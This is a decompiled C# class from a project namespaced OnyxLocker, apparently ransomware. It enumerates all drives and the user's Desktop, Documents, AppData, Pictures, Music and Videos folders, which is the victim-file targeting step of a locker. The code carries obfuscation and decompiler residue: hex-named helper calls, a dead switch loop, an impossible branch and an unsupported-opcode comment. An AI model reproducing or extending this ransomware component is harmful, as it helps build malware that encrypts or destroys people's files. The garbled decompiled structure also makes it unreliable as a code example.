using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using A;

namespace OnyxLocker.Classes;

internal class FolderBrowser : IDriveExplorer
{
	public List<string> GetStartingFolders()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		Func<DriveInfo, string> func = _003C_003Ec._003C_003E9__0_0;
		if (func == null)
		{
			while (true)
			{
				switch (5)
				{
				case 0:
					continue;
				}
				break;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
			}
			func = (_003C_003Ec._003C_003E9__0_0 = (DriveInfo drive) => drive.Name);
		}
		List<string> list = drives.Select(func).ToList();
		list.AddRange(c3c0603daf881140c5d8d7caf1fb708c5.c757cc4db113ae43c821f8f25a1fa333e(this));
		return list;
	}

	private List<string> GetSpecialFolders()
	{
		return new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)
		};
	}
}
